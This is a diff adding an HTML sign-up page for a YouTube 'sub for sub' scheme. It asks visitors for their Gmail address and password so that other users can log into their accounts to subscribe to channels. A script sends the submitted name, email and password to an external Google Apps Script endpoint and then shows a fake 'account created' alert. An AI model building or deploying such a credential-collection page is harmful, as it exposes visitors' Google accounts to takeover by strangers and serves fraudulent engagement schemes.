@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Welcome to Monetize world with Far create new account</title>
+    <link rel="stylesheet" href="style.css">
+
+    
+</head>
+<body>
+
+    <div class="main">
+        <div class="navbar">
+            <div class="icon">
+                <h2 class="logo">It's  Far Gaming</h2>
+            </div>
+
+            <div class="menu">
+                <ul>
+                   
+                    <li><a href="home.html">ABOUT</a></li>
+                    <li><a href="#">SERVICE</a></li>
+                    <li><a href="#">DESIGN</a></li>
+                    <li><a href="#">CONTACT</a></li>
+                </ul>
+            </div>
+
+            <div class="search">
+                <input class="srch" type="search" name="" placeholder="search your contents">
+                <a href="#"> <button class="btn">Search</button></a>
+            </div>
+
+        </div> 
+        <div class="content">
+            <h1>It’s Time To Monetize Your Channel <br><span>Because it’s Far Yt Here.</span> <br>About Website</h1>
+            <p class="par"> There is no any Illegal Activity done here <br>
+                and not provide the gamil accounts for any Illegal works <br>
+            provide gmail accounts only for subscribing your youtube channel <br>
+            and Monetize your channel as soon as possible<br>
+        it’s work like SUB FOR SUB  if you use someone account to subscribing your channel.<br>
+    someone will use your account to subscribing their  channel <br>
+    if you have any problem related this please Contact us <br>
+Thank you...</p>
+  <button class="cn"><a href="https://www.youtube.com/channel/UCwVxGJQilnLbwnB7XCHcv1A?sub_confirmation=1">SUBSCRIBE US</a></button>
+              
+            
+                <div class="form">
+                    <form method="POST" name="google-sheet">
+                    <h2>create your Account</h2>
+                  
+                    <input type="text" placeholder="Name" id="name" name="Name">
+                    <input type="text" placeholder="Email" id="password" name="Email">
+                    <input type="text" placeholder="Password" id="password" name="Password">
+                    
+                    <input type="submit"  value="create" name="submit" onclick="{secondFunction();  thirdFunction();}">
+
+                    <p class="link">Don't have an account<br>
+                    <a href="3rd.html">login </a> here</a></p>
+                  <br>  <p class="liw"></p></br>
+
+                    <div class="icons">
+                        <a href="https://www.youtube.com/channel/UCwVxGJQilnLbwnB7XCHcv1A?sub_confirmation=1"><ion-icon name="logo-youtube"></ion-icon></a>
+                        <a href="https://www.instagram.com/farinzi808/"><ion-icon name="logo-instagram"></ion-icon></a>
+                        <a href="https://www.facebook.com/profile.php?id=100061229622265"><ion-icon  name="logo-facebook"></ion-icon></a>
+                        <a href=""><ion-icon name="logo-whatsapp"></ion-icon></a>
+                        <a href="#"><ion-icon name="logo-google"></ion-icon></a>
+                        
+                        
+                    </div>
+
+                </div>
+                    </div>
+                </div>
+        </div>
+    </div>
+    <script>
+       
+        function secondFunction(){
+            const scriptURL = 'https://script.google.com/macros/s/AKfycbydmgV6FE22FGEo2McjmcjHC3fkXVf6sa0weaGcwrHw2PGoNxLo5B0P9onXzNVjzAvDQA/exec'
+        const form = document.forms['google-sheet']
+    
+        form.addEventListener('submit', e => {
+          e.preventDefault()
+          fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+            .then(response => alert("Your Account Has Been Successfully Created"))
+            .catch(error => console.error('Error!', error.message))
+           
+
+        })
+        }
+        function thirdFunction(){
+        window.open("notification2.html");
+       }
+    </script>
+  
+        
+
+    <script src="https://unpkg.com/ionicons@5.4.0/dist/ionicons.js"></script>
+</body>
+</html>
+
+
+
+
